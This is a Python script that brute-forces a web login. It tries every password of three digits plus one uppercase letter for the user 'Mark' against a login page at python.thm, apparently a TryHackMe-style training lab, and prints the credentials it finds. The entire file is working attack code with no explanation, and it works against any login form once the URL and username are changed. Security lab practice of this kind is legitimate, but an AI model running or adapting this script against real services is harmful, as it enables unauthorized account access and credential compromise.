import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

def brute_force():
    for i in range(1000):
        digits = str(i).zfill(3)

        for letter in string.ascii_uppercase:
            password = digits + letter

            data = {
                "username": username,
                "password": password
            }

            response = requests.post(url, data=data)

            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                print(response.text)
                return
            else:
                print(f"[-] Attempted: {password}")

brute_force()